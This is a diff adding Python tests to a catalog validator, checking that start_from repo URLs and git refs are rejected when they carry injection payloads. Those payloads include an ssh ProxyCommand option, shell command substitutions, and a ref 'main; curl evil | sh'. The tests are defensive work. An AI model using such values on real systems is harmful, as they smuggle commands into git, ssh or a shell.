@@ -1621,6 +1621,65 @@ CATALOG_CASES: list[tuple[str, int, str, str, bool]] = [
         False,
     ),
     (
+        "9: start_from repo is an ssh URL whose host is an option",
+        9,
+        with_start_from(
+            "start_from:\n      repo: 'ssh://-oProxyCommand=id/x'\n"
+            "      ref: main\n"
+        ),
+        "is not a Git URL",
+        False,
+    ),
+    (
+        "9: start_from repo is scp-style with a dash-led user",
+        9,
+        with_start_from(
+            "start_from:\n      repo: '-u@h:o/r'\n      ref: main\n"
+        ),
+        "is not a Git URL",
+        False,
+    ),
+    (
+        "9: start_from repo carries a shell command substitution",
+        9,
+        with_start_from(
+            "start_from:\n      repo: 'https://github.com/a/b`id`'\n"
+            "      ref: main\n"
+        ),
+        "is not a Git URL",
+        False,
+    ),
+    (
+        "9: start_from ref carries a shell command",
+        9,
+        with_start_from(
+            "start_from:\n      repo: https://github.com/a/b\n"
+            "      ref: 'main; curl evil | sh'\n"
+        ),
+        "is not a usable branch or tag name",
+        False,
+    ),
+    (
+        "9: start_from ref begins with a dash",
+        9,
+        with_start_from(
+            "start_from:\n      repo: https://github.com/a/b\n"
+            "      ref: '-main'\n"
+        ),
+        "is not a usable branch or tag name",
+        False,
+    ),
+    (
+        "9: start_from ref holds '..'",
+        9,
+        with_start_from(
+            "start_from:\n      repo: https://github.com/a/b\n"
+            "      ref: a..b\n"
+        ),
+        "is not a usable branch or tag name",
+        False,
+    ),
+    (
         "4: two entries share an id",
         4,
         catalog_doc(("a", "bundle"), ("a", "bundle")),
@@ -1816,17 +1875,25 @@ def test_validator_catalog_mode() -> None:
             "; ".join(str(f) for f in [*report.findings, *report.warnings])
             or repr((report.status.get(8), report.status.get(9))),
         )
-        for repo in ("https://h/o/r", "ssh://git@h/o/r.git", "u@h.example:o/r"):
+        for repo, ref in (
+            ("https://h/o/r", "main"),
+            ("ssh://git@h/o/r.git", "main"),
+            ("u@h.example:o/r", "main"),
+            ("git@github.com:org/repo.git", "main"),
+            ("ssh://git@host/x", "main"),
+            ("https://h/o/r", "release/1.2"),
+            ("https://h/o/r", "winner-m1"),
+        ):
             target.write_text(
                 with_start_from(
-                    f"start_from:\n      repo: {repo}\n      ref: main\n"
+                    f"start_from:\n      repo: {repo}\n      ref: {ref}\n"
                 ),
                 encoding="utf-8",
             )
             report = vb.validate_catalog(target, portable=False)
             record(
                 report.exit_code() == 0,
-                f"start_from repo {repo!r} is accepted",
+                f"start_from repo {repo!r}, ref {ref!r} is accepted",
                 "; ".join(str(f) for f in report.findings),
             )
         target.write_text(catalog_doc(("a", "bundle")), encoding="utf-8")
@@ -3105,11 +3172,23 @@ def test_read_start_from_value_by_value() -> None:
     good = {"repo": "https://github.com/o/r.git", "ref": "main"}
     value, notes = cat.read_start_from({"start_from": good}, "e")
     record(value == good and notes == [], "a valid mapping is returned", repr((value, notes)))
-    for repo in ("ssh://git@h/o/r.git", "git@github.com:o/r.git", "https://h/o/r"):
+    for repo in (
+        "ssh://git@h/o/r.git",
+        "git@github.com:o/r.git",
+        "git@github.com:org/repo.git",
+        "ssh://git@host/x",
+        "https://h/o/r",
+        "https://h:443/o/r",
+    ):
         value, notes = cat.read_start_from(
             {"start_from": {"repo": repo, "ref": "v1"}}, "e"
         )
         record(value is not None and notes == [], f"repo {repo!r} is usable", repr((value, notes)))
+    for ref in ("main", "release/1.2", "winner-m1", "v1", "_wip"):
+        value, notes = cat.read_start_from(
+            {"start_from": {"repo": "https://h/o/r", "ref": ref}}, "e"
+        )
+        record(value is not None and notes == [], f"ref {ref!r} is usable", repr((value, notes)))
     value, notes = cat.read_start_from({}, "e")
     record(value is None and notes == [], "absent is (None, no note)", repr((value, notes)))
     bad: list[Any] = [
@@ -3125,6 +3204,26 @@ def test_read_start_from_value_by_value() -> None:
         {"repo": "file:///x", "ref": "main"},
         {"repo": "https://h/o/r", "ref": "main", "extra": 1},
         None,
+        # Hostile values: each would reach a command the learner pastes
+        # into a shell, or be read by git or ssh as an option.
+        {"repo": "ssh://-oProxyCommand=id/x", "ref": "main"},
+        {"repo": "ssh://git@-oProxyCommand=id/x", "ref": "main"},
+        {"repo": "-u@h:o/r", "ref": "main"},
+        {"repo": "u@-h:o/r", "ref": "main"},
+        {"repo": "https://-h/o/r", "ref": "main"},
+        {"repo": "https://github.com/a/b`id`", "ref": "main"},
+        {"repo": "https://github.com/a/b$(id)", "ref": "main"},
+        {"repo": "https://github.com/a/b;id", "ref": "main"},
+        {"repo": "https://github.com/a/b c", "ref": "main"},
+        {"repo": "https://github.com/a/b", "ref": "main; curl evil | sh"},
+        {"repo": "https://h/o/r", "ref": "-main"},
+        {"repo": "https://h/o/r", "ref": "a..b"},
+        {"repo": "https://h/o/r", "ref": "a//b"},
+        {"repo": "https://h/o/r", "ref": "a/.b"},
+        {"repo": "https://h/o/r", "ref": "main/"},
+        {"repo": "https://h/o/r", "ref": "main.lock"},
+        {"repo": "https://h/o/r", "ref": "main@{1}"},
+        {"repo": "https://h/o/r", "ref": "$(id)"},
     ]
     for item in bad:
         value, notes = cat.read_start_from({"start_from": item}, "e")
